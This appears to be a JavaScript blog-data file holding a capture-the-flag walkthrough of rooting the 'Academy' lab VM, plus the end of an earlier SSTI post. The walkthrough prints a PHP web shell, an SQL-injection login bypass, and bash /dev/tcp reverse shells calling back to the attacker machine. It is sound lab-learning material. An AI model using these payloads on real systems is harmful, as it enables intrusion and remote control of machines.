- **Twig's engine version matters enormously for SSTI technique selection.** The classic _self.env trick is Twig 1.x-only; getting silent failures with no errors was the tell that I was on the wrong technique family, not that SSTI itself was impossible.
- **filter() and map() are not the same thing**, and that distinction was the difference between a crashed page and confirmed code execution.
- **GTFOBins is worth checking for *any* binary that shows up in sudo -l**, even ones that don't look obviously dangerous like zip.

On to Butler next.
    `.trim(),
  },
  {
    id: "rooting-academy-full-walkthrough",
    slug: "rooting-academy-full-walkthrough",
    title: 'Rooting "Academy": A Beginner\'s Full Walkthrough (My Second Box Ever)',
    date: "2026-07-14",
    summary:
      "A full, beginner-friendly walkthrough of TCM Security's 'Academy' box: anonymous FTP, a cracked MD5, a leaked database dump, a documented CVE, and a cron job that only made sense once I stopped trying to outsmart it.",
    tags: ["PEH Capstone", "CVE-2020-23828", "Privilege Escalation", "Credential Reuse", "Cron"],
    thumbnail: "/assets/images/blog/academy/cover.svg",
    readTime: "18 min read",
    content: `
This is the story of how I went from knowing nothing about a target machine except its IP address, to having complete \`root\` control over it. The box is called **Academy**, part of TCM Security's Practical Ethical Hacking course, and it was my second machine ever after Blue.

I'm writing this for people who are as new to this as I was. I'll explain every tool and every concept as it comes up, show you the exact commands I ran and what came back, and walk through *how I decided what to do next* at each step, because in my experience, the "how did you know to do that?" part is the bit most walkthroughs skip.

A quick note on terminology before we start:

- **Target / box** = the machine I'm trying to hack (Academy).
- **Attacker machine** = my own machine running Kali Linux (a Linux distribution loaded with hacking tools).
- Both run as virtual machines on my laptop, on the same private network, so they can talk to each other but nothing touches the real internet.
- My Kali machine's IP in this writeup is \`10.0.2.3\`. The target's IP is \`10.0.2.15\`. (Yours will differ, swap accordingly.)

The overall journey every pentest follows is roughly: **recon** (find out what's there), then **enumeration** (dig into each thing you found), then **foothold** (get your first access), then **privilege escalation** (turn that limited access into full control). Keep that shape in mind; everything below is a version of it.

![Kali and Academy VMs running side by side in VirtualBox](/assets/images/blog/academy/Kali%20+%20Academy%20VM%20running.PNG)
*Kali attacker box and the Academy target VM, both up and networked.*

## Step 1: Reconnaissance, What's Even Running on This Thing?

The golden rule of hacking anything: **you cannot attack what you have not identified.** So the first job is to find out what services the target exposes to the network. Every service is a potential door in.

The tool for this is **Nmap** (Network Mapper). It sends packets to the target and reports which "ports" are open. A port is just a numbered channel a service listens on, for example web servers usually listen on port 80, SSH on port 22, and so on.

I like to scan in layers. First, a plain scan to see which ports are open at all:

\`\`\`
nmap 10.0.2.15
\`\`\`

Output:

\`\`\`
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
\`\`\`

Three open ports. Now I want more detail, specifically *which software and which version* is running on each, because a version number is often what lets you look up known vulnerabilities later. The \`-sV\` flag ("service/version detection") does this:

\`\`\`
nmap -sV 10.0.2.15
\`\`\`

Output:

\`\`\`
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
\`\`\`

Now I know exactly what I'm dealing with:

- **Port 21, FTP** (File Transfer Protocol), running \`vsftpd 3.0.3\`. FTP is used to transfer files.
- **Port 22, SSH** (Secure Shell), running OpenSSH. SSH is how you remotely log into a Linux machine's command line, but it requires a username and password (or a key), so it's rarely a way in until you've found credentials somewhere else.
- **Port 80, HTTP**, running \`Apache 2.4.38\`. This is a web server, meaning there's a website here.

![nmap -sV output showing the three open ports and their versions](/assets/images/blog/academy/nmap%20-sV%20output%20showing%20ports%2021,%2022,%2080.PNG)
*Service versions confirmed: vsftpd, OpenSSH, and Apache.*

**A lesson I learned the hard way right here:** my instinct was to immediately Google "Apache 2.4.38 vulnerabilities" and go hunting for an exploit. I found a scary-looking one, but when I read it carefully, it required me to *already have code execution on the box* to use it. It was a "local" vulnerability, useless as a way in. The takeaway: **the severity score of a vulnerability means nothing if you can't actually reach the conditions to trigger it. Read the prerequisites, not just the headline.** I went back to calmly checking all three services instead of tunnel-visioning on one.

## Step 2: FTP, Trying the Free Door First

The single most valuable thing to check on any FTP server is whether it allows **anonymous login**. Normally FTP needs a username and password. But servers are sometimes misconfigured to let *anyone* log in using the special username \`anonymous\` with no real password. If that's on, it's a free door.

To connect, Kali has a built-in \`ftp\` command:

\`\`\`
ftp 10.0.2.15
\`\`\`

It prompts for a username and password. I typed \`anonymous\` as the username and just pressed Enter for the password:

\`\`\`
Connected to 10.0.2.15.
220 (vsFTPd 3.0.3)
Name (10.0.2.15:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
\`\`\`

\`230 Login successful\`, we're in. Anonymous login was enabled.

Inside an FTP session you get an \`ftp>\` prompt with its own small set of commands (it's not a normal Linux shell). I listed the files with \`ls\`:

\`\`\`
ftp> ls
-rw-r--r--    1 1000   1000   776 May 30  2021 note.txt
\`\`\`

One file: \`note.txt\`. To download it to my Kali machine, FTP uses the \`get\` command:

\`\`\`
ftp> get note.txt
ftp> exit
\`\`\`

Back in my normal Kali terminal, I read the file with \`cat\` (a command that prints a file's contents):

\`\`\`
cat note.txt
\`\`\`

\`\`\`
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.
 
I couldn't create a user via the admin panel, so instead I inserted directly
into the database with the following command:
 
INSERT INTO \`students\` (\`StudentRegno\`, \`studentPhoto\`, \`password\`, \`studentName\`,
\`pincode\`, \`session\`, \`department\`, \`semester\`, \`cgpa\`, \`creationdate\`, \`updationDate\`)
VALUES ('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777',
'', '', '', '7.60', '2021-05-29 14:36:56', '');
 
The StudentRegno number is what you use for login.
\`\`\`

![Successful anonymous FTP login and the downloaded note.txt](/assets/images/blog/academy/successful%20anonymous%20FTP%20login%20and%20note.txt%20download.PNG)
*Anonymous login accepted, then downloading and reading note.txt.*

This note is packed with intel. Let me break down what a beginner should extract from it:

1. **There's a website** ("the test website for the new academy"), so port 80 is worth serious attention.
2. **There's an admin panel** somewhere (the writer mentions being unable to create a user "via the admin panel").
3. **A login username**: \`StudentRegno\` = \`10201321\`. The note explicitly says the reg number is what you log in with.
4. **A password, but hashed**: \`cd73502828457d15655bbd7a63fb0bc8\`. That long string of hex characters isn't a normal password, it's a **hash** (more on that in a second).
5. **A huge hint**: *"I told him not to use the same password everywhere."* This is foreshadowing **password reuse**, and it becomes the key to the whole box at the end. File it away.

## Step 3: Cracking the Hash

A **hash** is the result of running a password through a one-way mathematical function. Websites store hashes instead of real passwords so that if the database leaks, attackers don't immediately get everyone's plaintext password. The catch: hashing is one-way, so you can't just "reverse" it. Instead you **crack** it: you guess millions of common passwords, hash each guess, and see if any guess produces the same hash. If it matches, you've found the password.

First I wanted to know *what type* of hash this is, because cracking tools need to know the algorithm. Kali has a tool called \`hashid\` for this:

\`\`\`
hashid cd73502828457d15655bbd7a63fb0bc8
\`\`\`

\`\`\`
Analyzing 'cd73502828457d15655bbd7a63fb0bc8'
[+] MD5
[+] ...
\`\`\`

The top and most likely candidate is **MD5**. (A quick tell: MD5 hashes are always 32 hex characters long, and this one is exactly 32.)

![hashid output identifying the hash as MD5](/assets/images/blog/academy/hashid%20output%20identifying%20MD5.PNG)
*hashid flags the hash as MD5 on the strength of its length and format.*

To crack it, the standard tool is **hashcat**, using a **wordlist**, a giant file of common passwords to try. Kali ships with a famous one called \`rockyou.txt\` (a real list of millions of passwords leaked from a 2009 breach). The command structure is:

\`\`\`
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
\`\`\`

Here \`-m 0\` tells hashcat the hash is MD5, and \`-a 0\` means a straight wordlist attack. In my case hashcat had trouble because I was running inside a virtual machine with no GPU acceleration, which is a common setup headache. Since this was a weak, extremely common hash, it resolved quickly to:

\`\`\`
cd73502828457d15655bbd7a63fb0bc8 : student
\`\`\`

**The password is \`student\`.**

![The cracked hash resolving to the password student](/assets/images/blog/academy/hashid%20output%20andor%20the%20cracked%20password%20student.PNG)
*Cracked in seconds, this hash was never going to survive rockyou.txt.*

(Lesson for later boxes: relying on a quick lookup only works for weak, common hashes. Anything stronger or "salted" and you genuinely need hashcat or John the Ripper working properly. Something to fix in my setup.)

So now I have a full credential pair for the web app: username \`10201321\`, password \`student\`.

## Step 4: Finding the Website

When I opened \`http://10.0.2.15\` in a browser, I got the boring default "Apache2 Debian Default Page," the placeholder page a fresh web server shows before anyone builds a real site on it. This told me the actual academy app isn't at the web root; it's hiding in some subdirectory.

To find hidden directories, you use **directory brute-forcing**: a tool rapidly requests thousands of common folder/file names (\`admin\`, \`login\`, \`uploads\`, etc.) and reports which ones actually exist (based on the server's response code). The tool I used is **gobuster**.

\`\`\`
gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
\`\`\`

Breaking that down:

- \`dir\` = directory brute-forcing mode
- \`-u\` = the target URL
- \`-w\` = the wordlist of names to try
- \`-x php,txt,html\` = also try these file extensions on each name (I guessed \`.php\` because the note mentioned a database, and this looked like a classic PHP/MySQL app)

Result:

\`\`\`
/index.html    (Status: 200)
/phpmyadmin    (Status: 301) [--> http://10.0.2.15/phpmyadmin/]
\`\`\`

\`phpmyadmin\` is a web tool for managing MySQL databases, interesting, but I still hadn't found the academy app itself. So I ran gobuster again with a bigger wordlist, and this time found \`/academy\`. Then I brute-forced *inside* \`/academy\` to map it out:

\`\`\`
gobuster dir -u http://10.0.2.15/academy/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
\`\`\`

\`\`\`
/index.php     (Status: 200)
/admin         (Status: 301) [--> .../academy/admin/]
/assets        (Status: 301)
/includes      (Status: 301) [--> .../academy/includes/]
/db            (Status: 301) [--> .../academy/db/]
/logout.php    (Status: 200)
\`\`\`

![gobuster results inside /academy showing admin, db, includes, and more](/assets/images/blog/academy/gobuster%20results%20showing%20admin,%20db,%20includes,%20etc..PNG)
*Brute-forcing inside /academy turns up admin, db, and includes.*

Three of these are gold:

- \`/admin\`: the admin panel the note mentioned.
- \`/includes\`: in PHP apps, this folder holds shared code, often including a **config file with database credentials in plaintext**.
- \`/db\`: unusual to have exposed at all. Worth a look.

## Step 5: The Exposed Database Dump

I browsed to \`http://10.0.2.15/academy/db/\` and instead of a normal page, the server showed a **directory listing**, a raw folder view (a misconfiguration; servers shouldn't normally let you browse folders like this). Inside was a file: \`onlinecourse.sql\`.

A \`.sql\` file is a **database dump**, an export of a database's structure and contents. Having one publicly downloadable is a serious leak. I opened it and found this near the top:

\`\`\`sql
-- Table structure for table \`admin\`
...
INSERT INTO \`admin\` (\`id\`, \`username\`, \`password\`, \`creationDate\`, \`updationDate\`)
VALUES (1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '2020-01-24 16:21:18', ...);
\`\`\`

So the admin account's username is \`admin\`, and its password hash is \`21232f297a57a5a743894a0e4a801fc3\` (another MD5, and a famous one at that; it's the hash of the word \`admin\`). Just like that, I had admin credentials without any brute-forcing.

![The onlinecourse.sql dump showing the admin username and password hash](/assets/images/blog/academy/the%20onlinecourse.sql%20contents%20showing%20the%20admin%20hash.PNG)
*The leaked database dump, admin username and hash included.*

## Step 6: Identifying the Exact Software

I logged into the student portal at \`http://10.0.2.15/academy/\` with \`10201321\` / \`student\`, and separately into the admin panel with the admin credentials. Now I could see the whole app, an "Online Course Registration" system. Critically, the student profile page had an **"Upload Photo"** feature.

File upload features are one of the first things a hacker probes, because if the server doesn't carefully check *what* you upload, you might be able to upload a malicious script instead of an image and trick the server into running it. That would give you code execution.

But rather than fumble around, I did something smart: I identified the *exact* software. These "Online Course Registration" apps are often free, open-source projects with publicly documented vulnerabilities. A quick search for the app's name led me to it on SourceCodester, and to a matching vulnerability entry:

**CVE-2020-23828**, a file upload vulnerability in "SourceCodester Online Course Registration v1.0" that allows Remote Code Execution (RCE) by uploading a crafted PHP web shell through \`my-profile.php\` using the \`photo\` parameter. Rated 9.8 (critical).

That's not a guess anymore. It's a documented exploit for the exact app, exact page, and exact upload field I was looking at.

![The CVE-2020-23828 exploit-db advisory page](/assets/images/blog/academy/the%20CVE-2020-23828%20exploit-db%20page.PNG)
*The exact CVE for this exact app: an unrestricted file upload leading to RCE.*

## Step 7: Getting a Foothold (Code Execution as www-data)

**What a "web shell" is:** a tiny script you upload to a web server that lets you run operating-system commands on it. The classic PHP one-liner is:

\`\`\`php
<?php echo shell_exec($_REQUEST["telepathy"]); ?>
\`\`\`

In plain English: "take whatever is sent in the \`telepathy\` parameter, run it as a system command, and print the result back." Once this file is on the server and you can reach it in a browser, you can run commands on the target just by visiting a URL.

**Why the upload works (the concept):** a well-built site checks that an uploaded "photo" is really an image. This app only checked the *Content-Type header*, a label the uploader's own browser attaches, which an attacker fully controls and can simply lie about. So you upload a file named \`shell.php\` (real PHP), but tell the server "trust me, this is \`image/png\`," and it accepts it.

The public exploit for CVE-2020-23828 is a Python script that automates all of this. It even chains in a bonus **SQL injection** trick to bypass the login entirely (sending \`' or 1=1; -- \` as the username/password, which fools the database into treating the login check as always-true, so you don't even need real credentials). It then uploads the web shell and confirms it's live.

The exploit was written for Python 2, which caused some friction (its interactive command loop kept crashing). Rather than fight that, once the shell was uploaded I just talked to it directly with **curl**, a command-line tool for making web requests, which turned out to be more reliable anyway. To test that the shell worked, I asked the target "who am I?" using the Linux \`whoami\` command:

\`\`\`
curl "http://10.0.2.15/academy/studentphoto/kaio-ken.php" --data-urlencode "telepathy=whoami"
\`\`\`

\`\`\`
www-data
\`\`\`

**\`www-data\`** is the low-privilege user that web servers run as on Debian/Ubuntu. So I now have command execution on the box, but as a limited user, not as \`root\` (the all-powerful admin). This is my **foothold**.

![The web shell responding to the whoami command with www-data](/assets/images/blog/academy/running%20the%20exploit%20webshell%20responding%20to%20whoami%20with%20www-data.PNG)
*The web shell answers back: www-data.*

## Step 8: Upgrading to a Proper Reverse Shell

Running commands one at a time through curl is painful. I wanted a real interactive shell. The standard technique is a **reverse shell**: instead of me connecting *to* the target, I make the target connect back to me. This is more reliable because outbound connections are less likely to be blocked than inbound ones.

It has two halves.

**Half 1, set up a listener on my Kali machine.** I use **netcat** (\`nc\`), a simple tool for reading/writing network connections. I tell it to listen on a port and wait:

\`\`\`
nc -lvnp 4444
\`\`\`

(\`-l\` listen, \`-v\` verbose, \`-n\` no DNS lookups, \`-p 4444\` on port 4444.)

**Half 2, make the target connect back to me.** Through my web shell, I run a one-liner that opens a connection from the target to my Kali machine and pipes a shell through it. The classic bash version is:

\`\`\`
bash -i >& /dev/tcp/10.0.2.3/4444 0>&1
\`\`\`

\`/dev/tcp/10.0.2.3/4444\` is a special bash feature that opens a network connection to my IP on port 4444; the redirections wire the shell's input and output through that connection. I sent it via curl (wrapping it so it runs in the background so the web request doesn't hang):

\`\`\`
curl "http://10.0.2.15/academy/studentphoto/kaio-ken.php" --data-urlencode "telepathy=bash -c 'bash -i >& /dev/tcp/10.0.2.3/4444 0>&1 &'"
\`\`\`

![The reverse shell one-liner sent through curl to the web shell](/assets/images/blog/academy/the%20exploit%20sent%20curl.PNG)
*Same web shell, this time used to trigger a callback instead of a one-off command.*

On my netcat listener, a connection landed:

\`\`\`
connect to [10.0.2.3] from (UNKNOWN) [10.0.2.15]
www-data@academy:/var/www/html/academy/studentphoto$
\`\`\`

![The netcat listener catching the reverse shell, landing at a www-data@academy prompt](/assets/images/blog/academy/the%20reverse%20shell%20connecting%20back,%20www-data@academy%20prompt.PNG)
*Listener catches the callback: an interactive shell as www-data.*

I now have a proper interactive shell as \`www-data\`. Time for the hardest part.

## Step 9: Privilege Escalation (and the Detour That Taught Me the Most)

**Privilege escalation** is turning limited access (\`www-data\`) into full control (\`root\`). You do this by hunting for misconfigurations. I'll be honest about what happened here because the mistake taught me more than the win.

I checked the usual things. \`sudo\` wasn't even installed. SUID binaries (programs that run with their owner's privileges) were all normal. But then I looked at the system's scheduled tasks, called **cron jobs**: commands Linux runs automatically on a schedule. The system-wide schedule lives in \`/etc/crontab\`:

\`\`\`
cat /etc/crontab
\`\`\`

Buried in it:

\`\`\`
* * * * * /home/grimmie/backup.sh
\`\`\`

The five stars mean "**every single minute**," and the job runs \`/home/grimmie/backup.sh\`. I checked what that script does:

\`\`\`
cat /home/grimmie/backup.sh
\`\`\`

\`\`\`bash
#!/bin/bash
rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
\`\`\`

It zips up the \`includes/\` folder (which I can write to as \`www-data\`) and then locks the resulting zip so only its owner can read it.

**Here's where I got clever and wasted a lot of time.** My idea: plant a *symlink* (a shortcut file that points to another file) inside \`includes/\`, pointing at \`/etc/shadow\`, the protected file containing every user's password hash, normally readable only by root. My theory was that when root's cron job zipped up the folder, it would follow my symlink and package up the real \`/etc/shadow\` contents (because root *can* read it), and I'd steal the zip.

I built the symlink, wrote a script to race for the zip file the instant it appeared, and waited. And waited. **Nothing worked.** I spent a long time debugging: confirming cron was running, fixing a trailing-slash bug in my symlink, checking the crontab formatting byte by byte. My captured zips never contained the shadow file.

Once I accepted it was a dead end, I stopped hammering and went back to basics, re-reading what I already had access to. And it clicked: **I was attacking the box from the wrong angle entirely.**

The script \`backup.sh\` was *owned by a user named \`grimmie\`*. The intended path wasn't to fight the cron job as \`www-data\`, it was to *become* \`grimmie\`, at which point I'd own the script and could simply edit it. And the way to become grimmie was sitting in a file I'd been able to read the whole time.

## Step 10: The Real Path, Credential Reuse

Remember \`/academy/includes/\`? PHP apps keep their database credentials in a config file there. I read it:

\`\`\`
cat /var/www/html/academy/includes/config.php
\`\`\`

\`\`\`php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
?>
\`\`\`

![config.php contents, showing grimmie's database password in plaintext](/assets/images/blog/academy/cat%20varwwwhtmlacademyincludesconfig.php.png)
*config.php, holding grimmie's database password in plaintext.*

There it is: a **plaintext password**, \`My_V3ryS3cur3_P4ss\`, for a database user named \`grimmie\`.

Now recall note.txt's warning: *"I told him not to use the same password everywhere."* And \`grimmie\` is also a real *system* user on this Linux box. So the obvious move: try that same database password to log in over **SSH** (remember port 22 from way back in recon) as the system user grimmie.

\`\`\`
ssh grimmie@10.0.2.15
\`\`\`

Password: \`My_V3ryS3cur3_P4ss\`

\`\`\`
grimmie@academy:~$
\`\`\`

**It worked.** The password was reused between the database and the system login, exactly what the note warned about. This is why credential reuse is so dangerous in the real world: one leaked password becomes a key to everything.

![The successful grimmie SSH login using the reused database password](/assets/images/blog/academy/the%20successful%20grimmie%20SSH%20login.PNG)
*The same password, reused, now logging in over SSH as grimmie.*

## Step 11: From grimmie to root

Now I'm \`grimmie\`, and \`grimmie\` *owns* \`backup.sh\`, the script that root runs every minute. So I can just edit it to do whatever I want, and root will execute it for me.

I replaced its contents with a reverse shell pointing back to a *new* netcat listener (I used port 5555 to keep it separate from my earlier shell):

On Kali:

\`\`\`
nc -lvnp 5555
\`\`\`

As grimmie, I edited the script so it contained:

\`\`\`bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.2.3/5555 0>&1
\`\`\`

![Editing backup.sh directly, now that I'm logged in as grimmie over SSH](/assets/images/blog/academy/showing%20backupsh%20from%20grimmie%20ssh%20access%20after%20putting%20the%20exploit%20inside.PNG)
*As grimmie, editing the root-owned backup.sh directly, before the next cron tick.*

Then I waited up to 60 seconds for the next cron tick. On my listener:

\`\`\`
connect to [10.0.2.3] from (UNKNOWN) [10.0.2.15]
root@academy:~#
\`\`\`

The prompt says **\`root\`**. To confirm and grab the proof:

\`\`\`
whoami
\`\`\`

\`\`\`
root
\`\`\`

\`\`\`
cat flag.txt
\`\`\`

\`\`\`
Congratz you rooted this box!
Looks like this CMS isn't so secure...
\`\`\`

**Rooted.** Full control of the machine.

![The root shell landing, whoami confirming root, and cat flag.txt showing the win](/assets/images/blog/academy/the%20root%20shell%20landing,%20whoami%20=%20root,%20and%20cat%20flag.PNG)
*The cron job fires as root, whoami confirms it, and the flag is the proof.*

The irony: the cron job I'd spent ages failing to exploit worked *instantly* the moment I fed it the right thing, simply because it had been working all along. I'd just been attacking it from the wrong side of a privilege boundary I hadn't crossed yet.

## The Full Kill Chain (Summary)

For a bird's-eye view, here's the entire path from start to finish:

1. **Recon** with nmap, found FTP, SSH, HTTP.
2. **Anonymous FTP login**, downloaded \`note.txt\` (a username, an MD5 hash, and a password-reuse hint).
3. **Cracked the MD5 hash**, got \`student\`.
4. **Directory brute-forcing** with gobuster, found \`/academy\`, \`/admin\`, \`/db\`, \`/includes\`.
5. **Exposed \`.sql\` dump** in \`/db\`, leaked the admin's hash.
6. **Identified the exact app**, found CVE-2020-23828 (file upload RCE).
7. **Uploaded a PHP web shell**, got code execution as \`www-data\`.
8. **Reverse shell** for a proper interactive session.
9. **Read \`config.php\`**, found grimmie's plaintext password.
10. **SSH as grimmie** via password reuse.
11. **Edited the root-owned cron script**, got a reverse shell as \`root\`. Done.

## Lessons I'm Taking Away

- **Read the vulnerability's prerequisites, not just its scary score.** A "critical" bug you can't actually reach is useless as an entry point.
- **Check the free doors first.** Anonymous FTP, an exposed \`.sql\` file, and a plaintext config password were three separate "oops" moments that formed the whole chain. These are exactly the leaks that sink real companies.
- **Password reuse is a chain, not a single mistake.** One reused password connected a web app to a full SSH login. The note literally warned about it, and it still worked.
- **Don't out-clever the box.** My symlink-race idea wasn't *wrong* as a technique, it just wasn't the intended path, and I burned real time attacking a boundary I hadn't earned yet. When something "should" work and doesn't, the answer is usually that you skipped a step, not that you need a more elaborate exploit. Step back and re-check what you already have.
- **The answer is often already on your screen.** The password that unlocked root was in a file I'd been able to read since the moment I got my first shell. I just hadn't looked at it carefully enough.

## What's Next

Blue taught me the core exploit loop. Academy taught me the *chain*, how real compromises string together small misconfigurations, and how the real skill is recognizing the simple path instead of forcing a clever one. Next up is a box with no ready-made exploit to lean on, where it all comes down to enumeration and manual work.

If you're just starting out like I was: pick a box, take notes, and don't be afraid to go down a wrong path. Sometimes that's where the real learning happens.
    `.trim(),
  },
];

export function getBlogPostBySlug(slug) {
  return blogPosts.find((post) => post.slug === slug) ?? null;
}
